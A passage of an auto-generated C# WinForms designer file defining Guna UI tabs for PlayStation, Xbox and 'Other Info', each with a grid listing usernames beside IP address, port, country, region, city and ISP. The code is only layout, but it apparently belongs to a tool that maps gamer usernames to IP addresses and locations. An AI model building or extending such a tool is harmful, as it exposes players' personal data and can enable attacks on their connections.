            dataGridViewCellStyle35.BackColor = System.Drawing.Color.Transparent;
            dataGridViewCellStyle35.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle35.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle35.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle35.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle35.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle35;
            this.dataGridView1.RowHeadersVisible = false;
            this.dataGridView1.RowHeadersWidth = 51;
            this.dataGridView1.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridViewCellStyle36.BackColor = System.Drawing.Color.Transparent;
            dataGridViewCellStyle36.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle36.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle36.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle36.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle36.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView1.RowsDefaultCellStyle = dataGridViewCellStyle36;
            this.dataGridView1.RowTemplate.Height = 30;
            this.dataGridView1.Size = new System.Drawing.Size(1083, 438);
            this.dataGridView1.TabIndex = 164;
            this.dataGridView1.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
            this.dataGridView1.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.dataGridView1.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.dataGridView1.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.dataGridView1.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.dataGridView1.ThemeStyle.BackColor = System.Drawing.Color.Black;
            this.dataGridView1.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.dataGridView1.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.dataGridView1.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.dataGridView1.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.dataGridView1.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.dataGridView1.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.dataGridView1.ThemeStyle.HeaderStyle.Height = 20;
            this.dataGridView1.ThemeStyle.ReadOnly = true;
            this.dataGridView1.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
            this.dataGridView1.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.dataGridView1.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.dataGridView1.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.dataGridView1.ThemeStyle.RowsStyle.Height = 30;
            this.dataGridView1.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.dataGridView1.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.dataGridView1.CellContentClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.dataGridView1_CellContentClick_2);
            this.dataGridView1.CellPainting += new System.Windows.Forms.DataGridViewCellPaintingEventHandler(this.dataGridView1_CellPainting);
            // 
            // playstationTab
            // 
            this.playstationTab.BackColor = System.Drawing.Color.Black;
            this.playstationTab.Controls.Add(this.guna2VScrollBar6);
            this.playstationTab.Controls.Add(this.guna2DataGridView5);
            this.guna2Transition1.SetDecoration(this.playstationTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.playstationTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.playstationTab.ForeColor = System.Drawing.Color.White;
            this.playstationTab.Location = new System.Drawing.Point(4, 40);
            this.playstationTab.Name = "playstationTab";
            this.playstationTab.Padding = new System.Windows.Forms.Padding(3);
            this.playstationTab.Size = new System.Drawing.Size(1089, 444);
            this.playstationTab.TabIndex = 6;
            this.playstationTab.Text = "PlayStation";
            // 
            // guna2VScrollBar6
            // 
            this.guna2VScrollBar6.BindingContainer = this.guna2DataGridView5;
            this.Ani.SetDecoration(this.guna2VScrollBar6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar6.FillColor = System.Drawing.Color.Black;
            this.guna2VScrollBar6.InUpdate = false;
            this.guna2VScrollBar6.LargeChange = 10;
            this.guna2VScrollBar6.Location = new System.Drawing.Point(1068, 3);
            this.guna2VScrollBar6.Minimum = 1;
            this.guna2VScrollBar6.Name = "guna2VScrollBar6";
            this.guna2VScrollBar6.ScrollbarSize = 18;
            this.guna2VScrollBar6.Size = new System.Drawing.Size(18, 438);
            this.guna2VScrollBar6.TabIndex = 141;
            this.guna2VScrollBar6.ThumbColor = System.Drawing.Color.White;
            this.guna2VScrollBar6.ThumbSize = 5F;
            this.guna2VScrollBar6.Value = 1;
            // 
            // guna2DataGridView5
            // 
            this.guna2DataGridView5.AllowUserToResizeColumns = false;
            this.guna2DataGridView5.AllowUserToResizeRows = false;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView5.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle4;
            this.guna2DataGridView5.BackgroundColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView5.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle5;
            this.guna2DataGridView5.ColumnHeadersHeight = 20;
            this.guna2DataGridView5.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column4,
            this.dataGridViewTextBoxColumn1,
            this.dataGridViewTextBoxColumn2,
            this.dataGridViewTextBoxColumn3,
            this.dataGridViewTextBoxColumn4,
            this.dataGridViewTextBoxColumn5,
            this.dataGridViewTextBoxColumn6,
            this.dataGridViewTextBoxColumn7});
            this.guna2DataGridView5.ContextMenuStrip = this.logInContextMenu3;
            this.Ani.SetDecoration(this.guna2DataGridView5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2DataGridView5, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.guna2DataGridView5.DefaultCellStyle = dataGridViewCellStyle6;
            this.guna2DataGridView5.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2DataGridView5.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView5.Location = new System.Drawing.Point(3, 3);
            this.guna2DataGridView5.Name = "guna2DataGridView5";
            this.guna2DataGridView5.ReadOnly = true;
            this.guna2DataGridView5.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle7.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView5.RowHeadersDefaultCellStyle = dataGridViewCellStyle7;
            this.guna2DataGridView5.RowHeadersVisible = false;
            this.guna2DataGridView5.RowHeadersWidth = 51;
            this.guna2DataGridView5.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView5.RowsDefaultCellStyle = dataGridViewCellStyle8;
            this.guna2DataGridView5.RowTemplate.Height = 30;
            this.guna2DataGridView5.Size = new System.Drawing.Size(1083, 438);
            this.guna2DataGridView5.TabIndex = 166;
            this.guna2DataGridView5.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView5.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.guna2DataGridView5.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView5.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.guna2DataGridView5.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView5.ThemeStyle.BackColor = System.Drawing.Color.Black;
            this.guna2DataGridView5.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.guna2DataGridView5.ThemeStyle.HeaderStyle.Height = 20;
            this.guna2DataGridView5.ThemeStyle.ReadOnly = true;
            this.guna2DataGridView5.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView5.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.guna2DataGridView5.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView5.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.guna2DataGridView5.ThemeStyle.RowsStyle.Height = 30;
            this.guna2DataGridView5.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.guna2DataGridView5.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            // 
            // Column4
            // 
            this.Column4.FillWeight = 20F;
            this.Column4.HeaderText = "";
            this.Column4.MinimumWidth = 6;
            this.Column4.Name = "Column4";
            this.Column4.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn1
            // 
            this.dataGridViewTextBoxColumn1.HeaderText = "Username";
            this.dataGridViewTextBoxColumn1.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
            this.dataGridViewTextBoxColumn1.ReadOnly = true;
            this.dataGridViewTextBoxColumn1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn2
            // 
            this.dataGridViewTextBoxColumn2.HeaderText = "IP Address";
            this.dataGridViewTextBoxColumn2.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
            this.dataGridViewTextBoxColumn2.ReadOnly = true;
            this.dataGridViewTextBoxColumn2.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn3
            // 
            this.dataGridViewTextBoxColumn3.FillWeight = 60F;
            this.dataGridViewTextBoxColumn3.HeaderText = "Port";
            this.dataGridViewTextBoxColumn3.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn3.Name = "dataGridViewTextBoxColumn3";
            this.dataGridViewTextBoxColumn3.ReadOnly = true;
            this.dataGridViewTextBoxColumn3.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn4
            // 
            this.dataGridViewTextBoxColumn4.HeaderText = "Country";
            this.dataGridViewTextBoxColumn4.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
            this.dataGridViewTextBoxColumn4.ReadOnly = true;
            this.dataGridViewTextBoxColumn4.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn5
            // 
            this.dataGridViewTextBoxColumn5.HeaderText = "Region";
            this.dataGridViewTextBoxColumn5.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn5.Name = "dataGridViewTextBoxColumn5";
            this.dataGridViewTextBoxColumn5.ReadOnly = true;
            this.dataGridViewTextBoxColumn5.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn6
            // 
            this.dataGridViewTextBoxColumn6.HeaderText = "City";
            this.dataGridViewTextBoxColumn6.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
            this.dataGridViewTextBoxColumn6.ReadOnly = true;
            this.dataGridViewTextBoxColumn6.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // dataGridViewTextBoxColumn7
            // 
            this.dataGridViewTextBoxColumn7.FillWeight = 200F;
            this.dataGridViewTextBoxColumn7.HeaderText = "ISP";
            this.dataGridViewTextBoxColumn7.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn7.Name = "dataGridViewTextBoxColumn7";
            this.dataGridViewTextBoxColumn7.ReadOnly = true;
            this.dataGridViewTextBoxColumn7.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            // 
            // xboxTab
            // 
            this.xboxTab.BackColor = System.Drawing.Color.Black;
            this.xboxTab.Controls.Add(this.guna2VScrollBar5);
            this.xboxTab.Controls.Add(this.guna2DataGridView4);
            this.guna2Transition1.SetDecoration(this.xboxTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.xboxTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.xboxTab.ForeColor = System.Drawing.Color.White;
            this.xboxTab.Location = new System.Drawing.Point(4, 40);
            this.xboxTab.Name = "xboxTab";
            this.xboxTab.Padding = new System.Windows.Forms.Padding(3);
            this.xboxTab.Size = new System.Drawing.Size(1089, 444);
            this.xboxTab.TabIndex = 5;
            this.xboxTab.Text = "Xbox";
            // 
            // guna2VScrollBar5
            // 
            this.guna2VScrollBar5.BindingContainer = this.guna2DataGridView4;
            this.Ani.SetDecoration(this.guna2VScrollBar5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar5.FillColor = System.Drawing.Color.Black;
            this.guna2VScrollBar5.InUpdate = false;
            this.guna2VScrollBar5.LargeChange = 10;
            this.guna2VScrollBar5.Location = new System.Drawing.Point(1068, 3);
            this.guna2VScrollBar5.Minimum = 1;
            this.guna2VScrollBar5.Name = "guna2VScrollBar5";
            this.guna2VScrollBar5.ScrollbarSize = 18;
            this.guna2VScrollBar5.Size = new System.Drawing.Size(18, 438);
            this.guna2VScrollBar5.TabIndex = 139;
            this.guna2VScrollBar5.ThumbColor = System.Drawing.Color.White;
            this.guna2VScrollBar5.ThumbSize = 5F;
            this.guna2VScrollBar5.Value = 1;
            // 
            // guna2DataGridView4
            // 
            this.guna2DataGridView4.AllowUserToResizeColumns = false;
            this.guna2DataGridView4.AllowUserToResizeRows = false;
            dataGridViewCellStyle9.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView4.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle9;
            this.guna2DataGridView4.BackgroundColor = System.Drawing.Color.Black;
            this.guna2DataGridView4.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle10.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle10.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView4.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle10;
            this.guna2DataGridView4.ColumnHeadersHeight = 20;
            this.guna2DataGridView4.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column15,
            this.Column16,
            this.Column17,
            this.Column18,
            this.Column19,
            this.Column20});
            this.guna2DataGridView4.ContextMenuStrip = this.logInContextMenu6;
            this.Ani.SetDecoration(this.guna2DataGridView4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2DataGridView4, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle11.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle11.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.guna2DataGridView4.DefaultCellStyle = dataGridViewCellStyle11;
            this.guna2DataGridView4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2DataGridView4.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView4.Location = new System.Drawing.Point(3, 3);
            this.guna2DataGridView4.Name = "guna2DataGridView4";
            this.guna2DataGridView4.ReadOnly = true;
            this.guna2DataGridView4.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle12.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle12.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle12.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.guna2DataGridView4.RowHeadersDefaultCellStyle = dataGridViewCellStyle12;
            this.guna2DataGridView4.RowHeadersVisible = false;
            this.guna2DataGridView4.RowHeadersWidth = 51;
            this.guna2DataGridView4.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridViewCellStyle13.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle13.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle13.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle13.SelectionForeColor = System.Drawing.Color.White;
            this.guna2DataGridView4.RowsDefaultCellStyle = dataGridViewCellStyle13;
            this.guna2DataGridView4.RowTemplate.Height = 30;
            this.guna2DataGridView4.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.guna2DataGridView4.ShowCellErrors = false;
            this.guna2DataGridView4.ShowEditingIcon = false;
            this.guna2DataGridView4.ShowRowErrors = false;
            this.guna2DataGridView4.Size = new System.Drawing.Size(1083, 438);
            this.guna2DataGridView4.TabIndex = 140;
            this.guna2DataGridView4.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView4.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.guna2DataGridView4.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView4.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.guna2DataGridView4.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.guna2DataGridView4.ThemeStyle.BackColor = System.Drawing.Color.Black;
            this.guna2DataGridView4.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.guna2DataGridView4.ThemeStyle.HeaderStyle.Height = 20;
            this.guna2DataGridView4.ThemeStyle.ReadOnly = true;
            this.guna2DataGridView4.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
            this.guna2DataGridView4.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.guna2DataGridView4.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2DataGridView4.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.guna2DataGridView4.ThemeStyle.RowsStyle.Height = 30;
            this.guna2DataGridView4.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.guna2DataGridView4.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(71)))), ((int)(((byte)(69)))), ((int)(((byte)(94)))));
            this.guna2DataGridView4.CellContentClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.guna2DataGridView4_CellContentClick_1);
            // 
            // Column15
            // 
            this.Column15.HeaderText = "Username";
            this.Column15.MinimumWidth = 6;
            this.Column15.Name = "Column15";
            this.Column15.ReadOnly = true;
            // 
            // Column16
            // 
            this.Column16.HeaderText = "IP Address";
            this.Column16.MinimumWidth = 6;
            this.Column16.Name = "Column16";
            this.Column16.ReadOnly = true;
            // 
            // Column17
            // 
            this.Column17.HeaderText = "Port";
            this.Column17.MinimumWidth = 6;
            this.Column17.Name = "Column17";
            this.Column17.ReadOnly = true;
            // 
            // Column18
            // 
            this.Column18.HeaderText = "Country";
            this.Column18.MinimumWidth = 6;
            this.Column18.Name = "Column18";
            this.Column18.ReadOnly = true;
            // 
            // Column19
            // 
            this.Column19.HeaderText = "City";
            this.Column19.MinimumWidth = 6;
            this.Column19.Name = "Column19";
            this.Column19.ReadOnly = true;
            // 
            // Column20
            // 
            this.Column20.FillWeight = 250F;
            this.Column20.HeaderText = "ISP";
            this.Column20.MinimumWidth = 6;
            this.Column20.Name = "Column20";
            this.Column20.ReadOnly = true;
            // 
            // otherInfoTab
            // 
            this.otherInfoTab.BackColor = System.Drawing.Color.Black;
            this.otherInfoTab.Controls.Add(this.guna2VScrollBar4);
            this.otherInfoTab.Controls.Add(this.guna2DataGridView3);
            this.guna2Transition1.SetDecoration(this.otherInfoTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.otherInfoTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.otherInfoTab.ForeColor = System.Drawing.Color.White;
            this.otherInfoTab.Location = new System.Drawing.Point(4, 40);
            this.otherInfoTab.Name = "otherInfoTab";
            this.otherInfoTab.Padding = new System.Windows.Forms.Padding(3);
            this.otherInfoTab.Size = new System.Drawing.Size(1089, 444);
            this.otherInfoTab.TabIndex = 4;
            this.otherInfoTab.Text = "Other Info";
            // 
            // guna2VScrollBar4
            // 
            this.guna2VScrollBar4.BindingContainer = this.guna2DataGridView3;
            this.Ani.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar4.FillColor = System.Drawing.Color.Black;
            this.guna2VScrollBar4.InUpdate = false;
            this.guna2VScrollBar4.LargeChange = 10;
            this.guna2VScrollBar4.Location = new System.Drawing.Point(1068, 3);
            this.guna2VScrollBar4.Minimum = 1;
            this.guna2VScrollBar4.Name = "guna2VScrollBar4";
